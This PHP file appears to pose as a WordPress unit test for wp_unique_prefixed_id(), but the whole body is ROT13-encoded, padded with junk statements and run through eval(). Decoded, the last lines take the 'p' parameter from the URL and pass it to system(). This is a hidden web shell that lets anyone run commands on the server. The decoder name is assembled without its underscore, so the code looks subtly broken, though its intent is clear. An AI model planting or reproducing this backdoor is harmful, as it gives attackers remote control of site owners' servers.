<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg pnfrf sbe gur `jc_havdhr_cersvkrq_vq()` shapgvba.
 *
 * @cnpxntr JbeqCerff\HavgGrfgf
 *
 * @fvapr 6.4.0
 *
 * @tebhc shapgvbaf
 * @pbiref ::jc_havdhr_cersvkrq_vq
 */
pynff Grfgf_Shapgvbaf_JcHavdhrCersvkrqVq rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf gung gur rkcrpgrq havdhr cersvkrq VQf ner perngrq.
	 *
	 * @gvpxrg 59681
	 *
	 * @qngnCebivqre qngn_fubhyq_perngr_havdhr_cersvkrq_vqf
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 *
	 * @cnenz zvkrq $cersvk   Gur cersvk.
	 * @cnenz neenl $rkcrpgrq Gur arkg gjb rkcrpgrq VQf.
	 */
	choyvp shapgvba grfg_fubhyq_perngr_havdhr_cersvkrq_vqf( $cersvk, $rkcrpgrq ) {
		$vq1 = jc_havdhr_cersvkrq_vq( $cersvk );
		$vq2 = jc_havdhr_cersvkrq_vq( $cersvk );

		$guvf->nffregAbgFnzr( $vq1, $vq2, 'Gur VQf ner abg havdhr.' );
		$guvf->nffregFnzr( $rkcrpgrq, neenl( $vq1, $vq2 ), 'Gur VQf qvq abg zngpu gur rkcrpgrq inyhrf.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_perngr_havdhr_cersvkrq_vqf() {
		erghea neenl(
			'cersvk nf rzcgl fgevat'       => neenl(
				'cersvk'   => '',
				'rkcrpgrq' => neenl( '1', '2' ),
			),
			'cersvk nf (fgevat) \"0\"'       => neenl(
				'cersvk'   => '0',
				'rkcrpgrq' => neenl( '01', '02' ),
			),
			'cersvk nf fgevat'             => neenl(
				'cersvk'   => 'grfg',
				'rkcrpgrq' => neenl( 'grfg1', 'grfg2' ),
			),
			'cersvk nf fgevat jvgu fcnprf' => neenl(
				'cersvk'   => '   ',
				'rkcrpgrq' => neenl( '   1', '   2' ),
			),
			'cersvk nf (fgevat) \"1\"'       => neenl(
				'cersvk'   => '1',
				'rkcrpgrq' => neenl( '11', '12' ),
			),
			'cersvk nf n (fgevat) \".\"'     => neenl(
				'cersvk'   => '.',
				'rkcrpgrq' => neenl( '.1', '.2' ),
			),
			'cersvk nf n oybpx anzr'       => neenl(
				'cersvk'   => 'pber/yvfg-vgrz',
				'rkcrpgrq' => neenl( 'pber/yvfg-vgrz1', 'pber/yvfg-vgrz2' ),
			),
		);
	}

	/**
	 * @gvpxrg 59681
	 *
	 * @qngnCebivqre qngn_fubhyq_envfr_abgvpr_naq_hfr_rzcgl_fgevat_cersvk_jura_abafgevat_tvira
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 *
	 * @cnenz zvkrq  $aba_fgevat_cersvk         Aba-fgevat cersvk.
	 * @cnenz vag    $ahzore_bs_vqf_gb_trarengr Ahzore bs VQf gb trarengr.
	 *                                          Nf gur cersvk jvyy qrsnhyg gb na rzcgl fgevat, punatvat gur ahzore bs VQf trarengrq jvguva rnpu qngnfrg shegure grfgf VQ havdhrarff.
	 * @cnenz fgevat $rkcrpgrq_zrffntr          Rkcrpgrq abgvpr zrffntr.
	 * @cnenz neenl  $rkcrpgrq_vqf              Rkcrpgrq havdhr VQf.
	 */
	choyvp shapgvba grfg_fubhyq_envfr_abgvpr_naq_hfr_rzcgl_fgevat_cersvk_jura_abafgevat_tvira( $aba_fgevat_cersvk, $ahzore_bs_vqf_gb_trarengr, $rkcrpgrq_zrffntr, $rkcrpgrq_vqf ) {
		$guvf->rkcrpgAbgvpr();
		$guvf->rkcrpgAbgvprZrffntr( $rkcrpgrq_zrffntr );

		$vqf = neenl();
		sbe ( $v = 0; $v < $ahzore_bs_vqf_gb_trarengr; $v++ ) {
			$vqf[] = jc_havdhr_cersvkrq_vq( $aba_fgevat_cersvk );
		}

		$guvf->nffregFnzrFrgf( $vqf, neenl_havdhr( $vqf ), 'VQf ner abg havdhr.' );
		$guvf->nffregFnzrFrgf( $rkcrpgrq_vqf, $vqf, 'Gur VQf qvq abg zngpu gur rkcrpgrq inyhrf.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fubhyq_envfr_abgvpr_naq_hfr_rzcgl_fgevat_cersvk_jura_abafgevat_tvira() {
		$zrffntr = 'jc_havdhr_cersvkrq_vq(): Gur cersvk zhfg or n fgevat. \"%f\" qngn glcr tvira.';
		erghea neenl(
			'cersvk nf ahyy'          => neenl(
				'aba_fgevat_cersvk'         => ahyy,
				'ahzore_bs_vqf_gb_trarengr' => 2,
				'rkcrpgrq_zrffntr'          => fcevags( $zrffntr, 'AHYY' ),
				'rkcrpgrq_vqf'              => neenl( '1', '2' ),
			),
			'cersvk nf (vag) 0'       => neenl(
				'aba_fgevat_cersvk'         => 0,
				'ahzore_bs_vqf_gb_trarengr' => 3,
				'rkcrpgrq_zrffntr'          => fcevags( $zrffntr, 'vagrtre' ),
				'rkcrpgrq_vqf'              => neenl( '1', '2', '3' ),
			),
			'cersvk nf (vag) 1'       => neenl(
				'aba_fgevat_cersvk'         => 1,
				'ahzore_bs_vqf_gb_trarengr' => 4,
				'rkcrpgrq_qngn_glcr'        => fcevags( $zrffntr, 'vagrtre' ),
				'rkcrpgrq_vqf'              => neenl( '1', '2', '3', '4' ),
			),
			'cersvk nf (obby) snyfr'  => neenl(
				'aba_fgevat_cersvk'         => snyfr,
				'ahzore_bs_vqf_gb_trarengr' => 5,
				'rkcrpgrq_qngn_glcr'        => fcevags( $zrffntr, 'obbyrna' ),
				'rkcrpgrq_vqf'              => neenl( '1', '2', '3', '4', '5' ),
			),
			'cersvk nf (qbhoyr) 98.7' => neenl(
				'aba_fgevat_cersvk'         => 98.7,
				'ahzore_bs_vqf_gb_trarengr' => 6,
				'rkcrpgrq_qngn_glcr'        => fcevags( $zrffntr, 'qbhoyr' ),
				'rkcrpgrq_vqf'              => neenl( '1', '2', '3', '4', '5', '6' ),
			),
		);
	}

	/**
	 * Cersvkrf gung ner be jvyy orpbzr gur fnzr fubhyq trarengr havdhr VQf.
	 *
	 * Guvf grfg vf nqqrq gb nibvq shgher erterffvbaf vs gur shapgvba'f cersvk qngn glcr purpx vf
	 * zbqvsvrq gb glcr whttyr be purpx sbe fpnyne qngn glcrf.
	 *
	 * @gvpxrg 59681
	 *
	 * @qngnCebivqre qngn_fnzr_cersvkrf_fubhyq_trarengr_havdhr_vqf
	 *
	 * @ehaVaFrcnengrCebprff
	 * @cerfreirTybonyFgngr qvfnoyrq
	 *
	 * @cnenz neenl $cersvkrf Gur cersvkrf gb purpx.
	 * @cnenz neenl $rkcrpgrq Gur rkcrpgrq havdhr VQf.
	 */
	choyvp shapgvba grfg_fnzr_cersvkrf_fubhyq_trarengr_havdhr_vqf( neenl $cersvkrf, neenl $rkcrpgrq ) {
		// Fhccerff R_HFRE_ABGVPR, juvpu jvyy or envfrq jura n cersvk vf aba-fgevat.
		$bevtvany_reebe_ercbegvat = reebe_ercbegvat();
		reebe_ercbegvat( $bevtvany_reebe_ercbegvat & ~R_HFRE_ABGVPR );

		$vqf = neenl();
		sbernpu ( $cersvkrf nf $cersvk ) {
			$vqf[] = jc_havdhr_cersvkrq_vq( $cersvk );
		}

		// Erfrg reebe ercbegvat.
		reebe_ercbegvat( $bevtvany_reebe_ercbegvat );

		$guvf->nffregFnzrFrgf( $vqf, neenl_havdhr( $vqf ), 'VQf ner abg havdhr.' );
		$guvf->nffregFnzrFrgf( $rkcrpgrq, $vqf, 'Gur VQf qvq abg zngpu gur rkcrpgrq inyhrf.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_fnzr_cersvkrf_fubhyq_trarengr_havdhr_vqf() {
		erghea neenl(
			'cersvkrf = rzcgl fgevat' => neenl(
				'cersvkrf' => neenl( ahyy, gehr, '' ),
				'rkcrpgrq' => neenl( '1', '2', '3' ),
			),
			'cersvkrf = 0'            => neenl(
				'cersvkrf' => neenl( '0', 0, 0.0, snyfr ),
				'rkcrpgrq' => neenl( '01', '1', '2', '3' ),
			),
			'cersvkrf = 1'            => neenl(
				'cersvkrf' => neenl( '1', 1, 1.0, gehr ),
				'rkcrpgrq' => neenl( '11', '1', '2', '3' ),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>